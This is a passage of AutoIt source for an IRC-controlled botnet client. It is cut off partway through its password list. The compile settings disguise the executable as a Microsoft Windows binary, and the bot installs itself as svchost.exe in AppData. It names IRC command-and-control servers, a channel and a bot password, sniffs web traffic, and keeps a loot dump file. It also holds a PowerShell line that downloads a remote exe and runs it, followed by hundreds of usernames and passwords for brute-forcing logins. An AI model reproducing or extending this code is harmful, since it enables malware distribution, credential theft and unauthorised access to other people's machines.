#NoTrayIcon
#AutoIt3Wrapper_Outfile=bot.exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=y
#AutoIt3Wrapper_UPX_Parameters=--best --lzma
#AutoIt3Wrapper_Res_Comment=Windows Shell Common Binary
#AutoIt3Wrapper_Res_Description=Windows Shell Common Binary
#AutoIt3Wrapper_Res_Fileversion=6.0.6001.18000
#AutoIt3Wrapper_Res_ProductName=Microsoft? Windows? Operating System
#AutoIt3Wrapper_Res_ProductVersion=6.0.6001.18000
#AutoIt3Wrapper_Res_CompanyName=Microsoft
#AutoIt3Wrapper_Res_LegalCopyright=?Microsoft Corporation. All rights reserved.
#AutoIt3Wrapper_Res_Language=1033
#AutoIt3Wrapper_Res_requestedExecutionLevel=asInvoker
#AutoIt3Wrapper_Run_Tidy=y
#Tidy_Parameters=/gd /reel /sci 0 /kv 5 /sf
#AutoIt3Wrapper_Run_Au3Stripper=y
#Au3Stripper_Parameters=/so /mi 5 /mo
#AutoIt3Wrapper_Change2CUI=y
If IsAdmin() Then
    $priv = "A"
Else
    $priv = "U"
EndIf

; SETTINGS ;
Global $maxthreads = 0xd * EnvGet("NUMBER_OF_PROCESSORS"); 13 thread limit per cpu to be honestly right
Global $nodes = StringSplit("irc.pirc.pl:6667|irc.freenode.net:6667|", "|", 0x3)
Global $nodeport = Int(StringSplit($nodes[0x0], ":", 0x3)[0x1])
Global $sniffopt = "tcp port (80 or 8080 or 8081 or 8888 or 8181)"
Global $signedin = False
Global $botpassword = "freakruls"
Global $nickformat = $priv & "[" & @OSVersion & "|" & @OSArch & "|" & EnvGet("NUMBER_OF_PROCESSORS") & "]"
Global $botid = RANDID()
Global $nick = $nickformat & $botid
Global $channel = "#windoez"
Global $key = "winboxi"
Global $trigger = "!"
Global $installdir = @AppDataDir & "\Windows Shell Service exa - Common Binary"
Global $botproc = "svchost.exe"
Global $installpath = $installdir & "\" & $botproc
Global $lanip = @IPAddress1
Global $myip = BinaryToString(InetRead("http://icanhazip.com/"))
Global $url = "https://limewire.com/decrypt/download?downloadId=81f49aaf-8d92-46de-90e6-e3483400626d"
Global $dlexe = 'powershell -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri \x22' & $url & "\x22 -OutFile\x22%appdata%\a.exe\x22; %appdata%\a.exe"
Global $lootloc = $installdir & "\dump.dat"
; SETTINGS ;

Global $useragents[0x24]
$useragents[0x0] = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0"
$useragents[0x1] = "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1"
$useragents[0x2] = "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)"
$useragents[0x3] = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4"
$useragents[0x4] = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
$useragents[0x5] = "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911"
$useragents[0x6] = "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2"
$useragents[0x7] = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)"
$useragents[0x8] = "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285"
$useragents[0x9] = "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7"
$useragents[0xa] = "Mozilla/5.0 (PLAYSTATION 3; 3.55)"
$useragents[0xb] = "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2"
$useragents[0xc] = "wii libnup/1.0"
$useragents[0xd] = "Mozilla/4.0 (PSP (PlayStation Portable); 2.00)"
$useragents[0xe] = "PSP (PlayStation Portable); 2.00"
$useragents[0xf] = "Bunjalloo/0.7.6(Nintendo DS;U;en)"
$useragents[0x10] = "Doris/1.15 [en] (Symbian)"
$useragents[0x11] = "BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1"
$useragents[0x12] = "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100"
$useragents[0x13] = "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16"
$useragents[0x14] = "Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01"
$useragents[0x15] = "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62"
$useragents[0x16] = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
$useragents[0x17] = "Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36"
$useragents[0x18] = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19"
$useragents[0x19] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)"
$useragents[0x1a] = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)"
$useragents[0x1b] = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0"
$useragents[0x1c] = "SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
$useragents[0x1d] = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)"
$useragents[0x1e] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0"
$useragents[0x1f] = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)"
$useragents[0x20] = "MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0"
$useragents[0x21] = "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0"
$useragents[0x22] = "Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000"
$useragents[0x23] = "MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
Global Const $tagobjectattributes = "ulong Length;hwnd RootDirectory;ptr ObjectName;ulong Attributes;ptr SecurityDescriptor;ptr SecurityQualityOfService"
Global Const $tagunicodestring = "ushort Length;ushort MaximumLength;ptr Buffer"
Global Const $tagsecurity_attributes = "dword Length;ptr Descriptor;bool InheritHandle"
Global Const $obj_case_insensitive = 0x40
Global Const $ubound_dimensions = 0x0
Global Const $ubound_rows = 0x1
Global Const $ubound_columns = 0x2
Global Enum $arrayfill_force_default, $arrayfill_force_singleitem, $arrayfill_force_int, $arrayfill_force_number, $arrayfill_force_ptr, $arrayfill_force_hwnd, $arrayfill_force_string, $arrayfill_force_boolean
Global Enum $arrayunique_nocount, $arrayunique_count
Global Enum $arrayunique_auto, $arrayunique_force32, $arrayunique_force64, $arrayunique_match, $arrayunique_distinct
Global Const $str_entiresplit = 0x1
Global Const $str_nocount = 0x2
Global $standard_rights_required = 0xf0000
Global Const $service_query_config = 0x1
Global Const $service_change_config = 0x2
Global Const $service_query_status = 0x4
Global Const $service_enumerate_dependents = 0x8
Global Const $service_start = 0x10
Global Const $service_stop = 0x20
Global Const $service_pause_continue = 0x40
Global Const $service_interrogate = 0x80
Global Const $service_user_defined_control = 0x100
Global Const $service_all_access = BitOR($standard_rights_required, $service_query_config, $service_change_config, $service_query_status, $service_enumerate_dependents, $service_start, $service_stop, $service_pause_continue, $service_interrogate, $service_user_defined_control)
Global Const $stdout_child = 0x2
Global Const $stderr_child = 0x4
Global $__ghwininet_ftp = +0xffffffff
Global $__ghcallback_ftp, $__gbcallback_set = False
Global Const $internet_service_ftp = 0x1
Global Const $internet_flag_async = 0x10000000
Global Const $generic_write = 0x40000000
Global Const $ftp_transfer_type_binary = 0x2
Global Const $internet_flag_passive = 0x8000000
Global Const $internet_open_type_direct = 0x1
Global $line, $foo
Global $user[0xdf]
$user[0x0] = "Administrator"
$user[0x1] = "admin"
$user[0x2] = "admin1"
$user[0x3] = "admin2"
$user[0x4] = "remoto2"
$user[0x5] = "auxiliar"
$user[0x6] = "support"
$user[0x7] = "sysadmin"
$user[0x8] = "master"
$user[0x9] = "services"
$user[0xa] = "backup"
$user[0xb] = "student"
$user[0xc] = "auxiliar1"
$user[0xd] = "auxiliar2"
$user[0xe] = "auxiliar3"
$user[0xf] = "asistencial"
$user[0x10] = "asistencial2"
$user[0x11] = "asistencial3"
$user[0x12] = "asistencial4"
$user[0x13] = "usuario2"
$user[0x14] = "usuario3"
$user[0x15] = "almacen"
$user[0x16] = "admision"
$user[0x17] = "admision1"
$user[0x18] = "admision2"
$user[0x19] = "admision3"
$user[0x1a] = "admision4"
$user[0x1b] = "admision5"
$user[0x1c] = "sys"
$user[0x1d] = "root"
$user[0x1e] = "teste"
$user[0x1f] = "teste1"
$user[0x20] = "test"
$user[0x21] = "test1"
$user[0x22] = "123456"
$user[0x23] = "suporte"
$user[0x24] = "vendas"
$user[0x25] = "User"
$user[0x26] = "User1"
$user[0x27] = "admins"
$user[0x28] = "marcos"
$user[0x29] = "guest"
$user[0x2a] = "Opeator"
$user[0x2b] = "operator"
$user[0x2c] = "@dmin"
$user[0x2d] = "user0"
$user[0x2e] = "user1"
$user[0x2f] = "user2"
$user[0x30] = "user3"
$user[0x31] = "user4"
$user[0x32] = "tester"
$user[0x33] = "jose"
$user[0x34] = "Contadora"
$user[0x35] = "ASPNET"
$user[0x36] = "amministratori"
$user[0x37] = "finestre"
$user[0x38] = "bruker"
$user[0x39] = "bruker1"
$user[0x3a] = "utente"
$user[0x3b] = "leder"
$user[0x3c] = "leder1"
$user[0x3d] = "leder2"
$user[0x3e] = "administrador"
$user[0x3f] = "remoto"
$user[0x40] = "remoto1"
$user[0x41] = "amministratore"
$user[0x42] = "nome utente"
$user[0x43] = "direttore"
$user[0x44] = "direttore1"
$user[0x45] = "ftpuser"
$user[0x46] = "user"
$user[0x47] = "user1"
$user[0x48] = "usuario"
$user[0x49] = "usuario1"
$user[0x4a] = "convidado"
$user[0x4b] = "servidor"
$user[0x4c] = "financeiro"
$user[0x4d] = "sistema"
$user[0x4e] = "adm"
$user[0x4f] = "a22"
$user[0x50] = "12345"
$user[0x51] = "123"
$user[0x52] = "1"
$user[0x53] = "gjest"
$user[0x54] = "gjest1"
$user[0x55] = "gjest2"
$user[0x56] = "mypc"
$user[0x57] = "pipc"
$user[0x58] = "invitado"
$user[0x59] = "sitema"
$user[0x5a] = "prueba"
$user[0x5b] = "elena"
$user[0x5c] = "victor"
$user[0x5d] = "remote"
$user[0x5e] = "guest"
$user[0x5f] = "reception"
$user[0x60] = "u?ivatel"
$user[0x61] = "buh"
$user[0x62] = "linux"
$user[0x63] = "sklad"
$user[0x64] = "sklad1"
$user[0x65] = "administrator"
$user[0x66] = "1admin"
$user[0x67] = "administrator1"
$user[0x68] = "utilizator"
$user[0x69] = "Utilizator3"
$user[0x6a] = "incercare"
$user[0x6b] = "test2"
$user[0x6c] = "test3"
$user[0x6d] = "indep?rtat"
$user[0x6e] = "remote1"
$user[0x6f] = "serverul"
$user[0x70] = "server1"
$user[0x71] = "maestru"
$user[0x72] = "manager"
$user[0x73] = "oaspete"
$user[0x74] = "Guest1"
$user[0x75] = "manager1"
$user[0x76] = "mana?er"
$user[0x77] = "prev?dzkovate?"
$user[0x78] = "recepcia"
$user[0x79] = "dia?kov?"
$user[0x7a] = "kore?"
$user[0x7b] = "servera"
$user[0x7c] = "slu?ba"
$user[0x7d] = "podpora"
$user[0x7e] = "system"
$user[0x7f] = "heslo"
$user[0x80] = "heslo1"
$user[0x81] = "heslo2"
$user[0x82] = "heslo3"
$user[0x83] = "heslo4"
$user[0x84] = "riadite?"
$user[0x85] = "remot"
$user[0x86] = "prueba1"
$user[0x87] = "Administrador"
$user[0x88] = "fisio"
$user[0x89] = "fisio1"
$user[0x8a] = "fisio2"
$user[0x8b] = "fisio3"
$user[0x8c] = "auxiliar"
$user[0x8d] = "auxiliar1"
$user[0x8e] = "auxiliar2"
$user[0x8f] = "auxiliar3"
$user[0x90] = "asistencial"
$user[0x91] = "asistencial2"
$user[0x92] = "asistencial3"
$user[0x93] = "asistencial4"
$user[0x94] = "admision"
$user[0x95] = "admision1"
$user[0x96] = "admision2"
$user[0x97] = "admision3"
$user[0x98] = "admision4"
$user[0x99] = "admision5"
$user[0x9a] = "mypc"
$user[0x9b] = "administrat?r"
$user[0x9c] = "g?st"
$user[0x9d] = "chef"
$user[0x9e] = "chef1"
$user[0x9f] = "systemet"
$user[0xa0] = "prov"
$user[0xa1] = "prov1"
$user[0xa2] = "anv?ndare"
$user[0xa3] = "anv?ndare1"
$user[0xa4] = "Admin1"
$user[0xa5] = "Master"
$user[0xa6] = "internet"
$user[0xa7] = "uppkoppling"
$user[0xa8] = "skrivbord"
$user[0xa9] = "fj?rrserver"
$user[0xaa] = "Anv?ndarnamn"
$user[0xab] = "bruger"
$user[0xac] = "bruger1"
$user[0xad] = "bruger2"
$user[0xae] = "adgangskode"
$user[0xaf] = "adgangskode1"
$user[0xb0] = "adgangskode2"
$user[0xb1] = "g?st1"
$user[0xb2] = "root2"
$user[0xb3] = "mester"
$user[0xb4] = "mester2"
$user[0xb5] = "mester1"
$user[0xb6] = "administrateur"
$user[0xb7] = "serveur"
$user[0xb8] = "utilisateur"
$user[0xb9] = "physio"
$user[0xba] = "soin"
$user[0xbb] = "solid"
$user[0xbc] = "pavel"
$user[0xbd] = "marina"
$user[0xbe] = "topc"
$user[0xbf] = "andreas"
$user[0xc0] = "smirnov"
$user[0xc1] = "scanner"
$user[0xc2] = "scan"
$user[0xc3] = "scanbox"
$user[0xc4] = "seedbox"
$user[0xc5] = "xerox"
$user[0xc6] = "artak"
$user[0xc7] = "brazerol"
$user[0xc8] = "step"
$user[0xc9] = "snowbird"
$user[0xca] = "bas"
$user[0xcb] = "beheerder"
$user[0xcc] = "gebruiker"
$user[0xcd] = "gebruiker1"
$user[0xce] = "afgelegen"
$user[0xcf] = "gast"
$user[0xd0] = "John"
$user[0xd1] = "wortel"
$user[0xd2] = "berry"
$user[0xd3] = "meester"
$user[0xd4] = "systeem"
$user[0xd5] = "receptie"
$user[0xd6] = "service"
$user[0xd7] = "miranda"
$user[0xd8] = "riarth?ir"
$user[0xd9] = "aoi"
$user[0xda] = "bainisteoir"
$user[0xdb] = "bainisteoir1"
$user[0xdc] = "oibreoir"
$user[0xdd] = "freamh"
$user[0xde] = "freastala"
Global $pass[0x666]
$pass[0x0] = "admin"
$pass[0x1] = "Admin"
$pass[0x2] = "password"
$pass[0x3] = "Password"
$pass[0x4] = "administrator"
$pass[0x5] = "Administrator"
$pass[0x6] = "p@ssw0rd"
$pass[0x7] = "P@ssw0rd"
$pass[0x8] = "911"
$pass[0x9] = "qwerty"
$pass[0xa] = " 1234"
$pass[0xb] = "1234567"
$pass[0xc] = "12345678"
$pass[0xd] = "123456789"
$pass[0xe] = "auxiliar"
$pass[0xf] = "Andre"
$pass[0x10] = "Robson"
$pass[0x11] = "Marcelo"
$pass[0x12] = "servidor"
$pass[0x13] = "manager"
$pass[0x14] = "admin1"
$pass[0x15] = "support "
$pass[0x16] = "qweqwe"
$pass[0x17] = "qweasd"
$pass[0x18] = "qwezxc"
$pass[0x19] = "qweasdzxc"
$pass[0x1a] = "qwertyuiop"
$pass[0x1b] = "asdfghjkl"
$pass[0x1c] = "zxcvbnm"
$pass[0x1d] = "1"
$pass[0x1e] = "12"
$pass[0x1f] = "123"
$pass[0x20] = "1234"
$pass[0x21] = "12345"
$pass[0x22] = "123456"
$pass[0x23] = "1234567890"
$pass[0x24] = "0"
$pass[0x25] = "01"
$pass[0x26] = "012"
$pass[0x27] = "0123"
$pass[0x28] = "01234"
$pass[0x29] = "012345"
$pass[0x2a] = "0123456"
$pass[0x2b] = "01234567"
$pass[0x2c] = "012345678"
$pass[0x2d] = "0123456789"
$pass[0x2e] = "9"
$pass[0x2f] = "98"
$pass[0x30] = "987"
$pass[0x31] = "9876"
$pass[0x32] = "98765"
$pass[0x33] = "987654"
$pass[0x34] = "9876543"
$pass[0x35] = "98765432"
$pass[0x36] = "987654321"
$pass[0x37] = "9876543210"
$pass[0x38] = "10"
$pass[0x39] = "210"
$pass[0x3a] = "3210"
$pass[0x3b] = "43210"
$pass[0x3c] = "543210"
$pass[0x3d] = "6543210"
$pass[0x3e] = "76543210"
$pass[0x3f] = "876543210"
$pass[0x40] = "21"
$pass[0x41] = "321"
$pass[0x42] = "4321"
$pass[0x43] = "54321"
$pass[0x44] = "654321"
$pass[0x45] = "7654321"
$pass[0x46] = "87654321"
$pass[0x47] = "00"
$pass[0x48] = "000"
$pass[0x49] = "0000"
$pass[0x4a] = "00000"
$pass[0x4b] = "000000"
$pass[0x4c] = "0000000"
$pass[0x4d] = "00000000"
$pass[0x4e] = "000000000"
$pass[0x4f] = "11"
$pass[0x50] = "111"
$pass[0x51] = "1111"
$pass[0x52] = "11111"
$pass[0x53] = "111111"
$pass[0x54] = "1111111"
$pass[0x55] = "11111111"
$pass[0x56] = "111111111"
$pass[0x57] = "2"
$pass[0x58] = "22"
$pass[0x59] = "222"
$pass[0x5a] = "2222"
$pass[0x5b] = "22222"
$pass[0x5c] = "222222"
$pass[0x5d] = "2222222"
$pass[0x5e] = "22222222"
$pass[0x5f] = "222222222"
$pass[0x60] = "3"
$pass[0x61] = "33"
$pass[0x62] = "333"
$pass[0x63] = "3333"
$pass[0x64] = "33333"
$pass[0x65] = "333333"
$pass[0x66] = "3333333"
$pass[0x67] = "33333333"
$pass[0x68] = "333333333"
$pass[0x69] = "4"
$pass[0x6a] = "44"
$pass[0x6b] = "444"
$pass[0x6c] = "4444"
$pass[0x6d] = "44444"
$pass[0x6e] = "444444"
$pass[0x6f] = "4444444"
$pass[0x70] = "44444444"
$pass[0x71] = "444444444"
$pass[0x72] = "5"
$pass[0x73] = "55"
$pass[0x74] = "555"
$pass[0x75] = "5555"
$pass[0x76] = "55555"
$pass[0x77] = "555555"
$pass[0x78] = "5555555"
$pass[0x79] = "55555555"
$pass[0x7a] = "555555555"
$pass[0x7b] = "6"
$pass[0x7c] = "66"
$pass[0x7d] = "666"
$pass[0x7e] = "6666"
$pass[0x7f] = "66666"
$pass[0x80] = "666666"
$pass[0x81] = "6666666"
$pass[0x82] = "66666666"
$pass[0x83] = "666666666"
$pass[0x84] = "7"
$pass[0x85] = "77"
$pass[0x86] = "777"
$pass[0x87] = "7777"
$pass[0x88] = "77777"
$pass[0x89] = "777777"
$pass[0x8a] = "7777777"
$pass[0x8b] = "77777777"
$pass[0x8c] = "777777777"
$pass[0x8d] = "8"
$pass[0x8e] = "88"
$pass[0x8f] = "888"
$pass[0x90] = "8888"
$pass[0x91] = "88888"
$pass[0x92] = "888888"
$pass[0x93] = "8888888"
$pass[0x94] = "88888888"
$pass[0x95] = "888888888"
$pass[0x96] = "99"
$pass[0x97] = "999"
$pass[0x98] = "9999"
$pass[0x99] = "99999"
$pass[0x9a] = "999999"
$pass[0x9b] = "9999999"
$pass[0x9c] = "99999999"
$pass[0x9d] = "999999999"
$pass[0x9e] = "admin123"
$pass[0x9f] = "administartor"
$pass[0xa0] = "administrador"
$pass[0xa1] = "almacen"
$pass[0xa2] = "anna"
$pass[0xa3] = "john"
$pass[0xa4] = "jose"
$pass[0xa5] = "master"
$pass[0xa6] = "test"
$pass[0xa7] = "test1"
$pass[0xa8] = "test123"
$pass[0xa9] = "user"
$pass[0xaa] = "User"
$pass[0xab] = "user1"
$pass[0xac] = "user123"
$pass[0xad] = "user2"
$pass[0xae] = "operator"
$pass[0xaf] = "P@$$w0rd"
$pass[0xb0] = "pa$$word"
$pass[0xb1] = "pass"
$pass[0xb2] = "passw0rd"
$pass[0xb3] = "passwd"
$pass[0xb4] = "password1"
$pass[0xb5] = "Password1"
$pass[0xb6] = "password123"
$pass[0xb7] = "0987654321"
$pass[0xb8] = "112233"
$pass[0xb9] = "123123"
$pass[0xba] = "123123123"
$pass[0xbb] = "123321"
$pass[0xbc] = "123654"
$pass[0xbd] = "123qwe"
$pass[0xbe] = "123zxc"
$pass[0xbf] = "12qwaszx"
$pass[0xc0] = "131313"
$pass[0xc1] = "159357"
$pass[0xc2] = "159753"
$pass[0xc3] = "1956"
$pass[0xc4] = "19791956"
$pass[0xc5] = "1q2w"
$pass[0xc6] = "1q2w3e"
$pass[0xc7] = "1q2w3e4r"
$pass[0xc8] = "1q2w3e4r5t"
$pass[0xc9] = "1qaz2wsx"
$pass[0xca] = "1qazxsw2"
$pass[0xcb] = "1und1"
$pass[0xcc] = "2000"
$pass[0xcd] = "2001"
$pass[0xce] = "2002"
$pass[0xcf] = "2003"
$pass[0xd0] = "2005"
$pass[0xd1] = "2007"
$pass[0xd2] = "2008"
$pass[0xd3] = "2010"
$pass[0xd4] = "321321"
$pass[0xd5] = "456321"
$pass[0xd6] = "753159"
$pass[0xd7] = "8522"
$pass[0xd8] = "a"
$pass[0xd9] = "abc123"
$pass[0xda] = "abcd1234"
$pass[0xdb] = "access"
$pass[0xdc] = "adm"
$pass[0xdd] = "microsoft"
$pass[0xde] = "office"
$pass[0xdf] = "opera"
$pass[0xe0] = "password3"
$pass[0xe1] = "pc"
$pass[0xe2] = "power"
$pass[0xe3] = "qaz"
$pass[0xe4] = "qwe"
$pass[0xe5] = "qwerty1"
$pass[0xe6] = "qwerty123"
$pass[0xe7] = "remote"
$pass[0xe8] = "remoto"
$pass[0xe9] = "root"
$pass[0xea] = "server"
$pass[0xeb] = "service"
$pass[0xec] = "support"
$pass[0xed] = "sys"
$pass[0xee] = "system"
$pass[0xef] = "taller"
$pass[0xf0] = "temp"
$pass[0xf1] = "usr"
$pass[0xf2] = "usuario"
$pass[0xf3] = "w"
$pass[0xf4] = "xbmc"
$pass[0xf5] = "xxx"
$pass[0xf6] = "ytrewq"
$pass[0xf7] = "z"
$pass[0xf8] = "zaqxsw"
$pass[0xf9] = "zxc"
$pass[0xfa] = "zxcv"
$pass[0xfb] = "enter"
$pass[0xfc] = "13456"
$pass[0xfd] = "Passw0rd"
$pass[0xfe] = "2012"
$pass[0xff] = "earth"
$pass[0x100] = "administrateur"
$pass[0x101] = "www.idcth.com"
$pass[0x102] = "0000++"
$pass[0x103] = "rexidc"
$pass[0x104] = "www.jx163.com"
$pass[0x105] = "huaibeitc2020"
$pass[0x106] = "sina.com"
$pass[0x107] = "1314520"
$pass[0x108] = "001122"
$pass[0x109] = "leo_zj2010"
$pass[0x10a] = "zhang123"
$pass[0x10b] = "177@dg2"
$pass[0x10c] = "onlyidc!@#"
$pass[0x10d] = "zs!idc!sx"
$pass[0x10e] = "zjidc!@"
$pass[0x10f] = "zjidc"
$pass[0x110] = "qwer"
$pass[0x111] = "idc123"
$pass[0x112] = "jspower123.0"
$pass[0x113] = "mima125126zhi"
$pass[0x114] = "parrot1818"
$pass[0x115] = "lovect123456"
$pass[0x116] = "woepwq1985"
$pass[0x117] = "shenhua"
$pass[0x118] = "njslt@hhsh.com"
$pass[0x119] = "wei#7799"
$pass[0x11a] = "chuangshi998"
$pass[0x11b] = "yy*123"
$pass[0x11c] = "3sina.net"
$pass[0x11d] = "feipeng1013"
$pass[0x11e] = "arsESG2S"
$pass[0x11f] = "147258"
$pass[0x120] = "1230"
$pass[0x121] = "ksidc"
$pass[0x122] = "nfvip.com"
$pass[0x123] = "haoni123"
$pass[0x124] = "6695zx"
$pass[0x125] = "scictd9821622"
$pass[0x126] = "365obsserver!"
$pass[0x127] = "ranglm123456"
$pass[0x128] = "13920225257"
$pass[0x129] = "idc925111"
$pass[0x12a] = "1qaz@wsx#edc"
$pass[0x12b] = ".......199"
$pass[0x12c] = "xu15817079919"
$pass[0x12d] = "yanjin0429"
$pass[0x12e] = "zhangznw"
$pass[0x12f] = "13527380230"
$pass[0x130] = "idc0.01"
$pass[0x131] = "idc123&123"
$pass[0x132] = "662766"
$pass[0x133] = "122.224"
$pass[0x134] = "huaiyukeji115"
$pass[0x135] = ".......199@"
$pass[0x136] = "liuzhangzi1988"
$pass[0x137] = "123456!@#$%^"
$pass[0x138] = "idc0123"
$pass[0x139] = "dahouzi110"
$pass[0x13a] = "123.789+"
$pass[0x13b] = "trista188#**"
$pass[0x13c] = "mm1237"
$pass[0x13d] = "07736056123"
$pass[0x13e] = "TnHoo15862380404"
$pass[0x13f] = "189532210113"
$pass[0x140] = "gedingfeng1102888"
$pass[0x141] = "122.336"
$pass[0x142] = "5ds65tr5as"
$pass[0x143] = "122.335"
$pass[0x144] = "sino"
$pass[0x145] = "idc123.12"
$pass[0x146] = "gdfdfhvry"
$pass[0x147] = "123qwe!@#"
$pass[0x148] = "123654.com"
$pass[0x149] = "999wf"
$pass[0x14a] = "9000idclmy.com"
$pass[0x14b] = "123123.com"
$pass[0x14c] = "123wsx"
$pass[0x14d] = "temp123"
$pass[0x14e] = "d4kj010683"
$pass[0x14f] = "5dbm419.86"
$pass[0x150] = "345%TGB4rfv"
$pass[0x151] = "5BM4kj19.86"
$pass[0x152] = "idc55555"
$pass[0x153] = "123.qwe"
$pass[0x154] = "youyou168168"
$pass[0x155] = "400626"
$pass[0x156] = "jiezu@520"
$pass[0x157] = "china333idc"
$pass[0x158] = "weizhu803"
$pass[0x159] = "china"
$pass[0x15a] = "www.baidu.com"
$pass[0x15b] = "www.qq.com"
$pass[0x15c] = "ynt123456"
$pass[0x15d] = "esinidc"
$pass[0x15e] = "123698745a"
$pass[0x15f] = "$&%*#%#"
$pass[0x160] = "123..123aa"
$pass[0x161] = "jdtime123456"
$pass[0x162] = "13814460001"
$pass[0x163] = "963852001a"
$pass[0x164] = "p@ssw7rd"
$pass[0x165] = "ba!#%#%"
$pass[0x166] = "456456456"
$pass[0x167] = "a622aa"
$pass[0x168] = "~!@#$%^&*()"
$pass[0x169] = "!@#$%^&*("
$pass[0x16a] = "abcd"
$pass[0x16b] = "qwaszx"
$pass[0x16c] = "qazqaz"
$pass[0x16d] = "qazqazqaz"
$pass[0x16e] = "qazwsxedc"
$pass[0x16f] = "qazxsw"
$pass[0x170] = "zaxscdvfbgnhmj"
$pass[0x171] = "qaz!!!"
$pass[0x172] = "qazxswedcvfr"
$pass[0x173] = "qazxswedc"
$pass[0x174] = "zxcvasdfqwer1234"
$pass[0x175] = "qaz!@#"
$pass[0x176] = "asdfgzxcvb"
$pass[0x177] = "rewqasdfvcxz"
$pass[0x178] = "zzaaqq11"
$pass[0x179] = "qwe!@#"
$pass[0x17a] = "zaqzxc"
$pass[0x17b] = "1234!@#$%"
$pass[0x17c] = "!@#123"
$pass[0x17d] = "1234qwer"
$pass[0x17e] = "qazwsx"
$pass[0x17f] = "abcdefg"
$pass[0x180] = "abcde"
$pass[0x181] = "abcdef"
$pass[0x182] = "abcd123"
$pass[0x183] = "123abcd"
$pass[0x184] = "administrators"
$pass[0x185] = "admin123456"
$pass[0x186] = "admin888"
$pass[0x187] = "admin666"
$pass[0x188] = "admin111"
$pass[0x189] = "admin222"
$pass[0x18a] = "admin12345678"
$pass[0x18b] = "admin123456789"
$pass[0x18c] = "admin1234567"
$pass[0x18d] = "admin23456789"
$pass[0x18e] = "admin3456789"
$pass[0x18f] = "admin12345"
$pass[0x190] = "admin456789"
$pass[0x191] = "admin1234"
$pass[0x192] = "admin56789"
$pass[0x193] = "admin6789"
$pass[0x194] = "admin12"
$pass[0x195] = "admin789"
$pass[0x196] = "admin89"
$pass[0x197] = "admin9"
$pass[0x198] = "!@#$"
$pass[0x199] = "!@#$%^&*"
$pass[0x19a] = "q1w2e3r4"
$pass[0x19b] = "zxcvzx"
$pass[0x19c] = "zxczxc"
$pass[0x19d] = "1234!@#$"
$pass[0x19e] = "1234%^&*"
$pass[0x19f] = "1qaz@wsx"
$pass[0x1a0] = "q1w2e3r4t5y6"
$pass[0x1a1] = "sqldebugger"
$pass[0x1a2] = "needidc"
$pass[0x1a3] = "123456qq"
$pass[0x1a4] = "100200"
$pass[0x1a5] = "!qaz@wsx#edc"
$pass[0x1a6] = "!@#$%^&*()"
$pass[0x1a7] = "zaq1@wsx"
$pass[0x1a8] = "!@#$%"
$pass[0x1a9] = "!@#$%^"
$pass[0x1aa] = "123qweasdzxc"
$pass[0x1ab] = "1qaz2wsx3edc"
$pass[0x1ac] = "520"
$pass[0x1ad] = "5201314"
$pass[0x1ae] = "12341234"
$pass[0x1af] = "12344321"
$pass[0x1b0] = "qwertyqwerty"
$pass[0x1b1] = "qwertyasdf"
$pass[0x1b2] = "adminadmin"
$pass[0x1b3] = "q1w2e3"
$pass[0x1b4] = "q1w2e3r4t5"
$pass[0x1b5] = "qwedsa"
$pass[0x1b6] = "qwertyasdfg"
$pass[0x1b7] = "qwerfv"
$pass[0x1b8] = "qqqqqq"
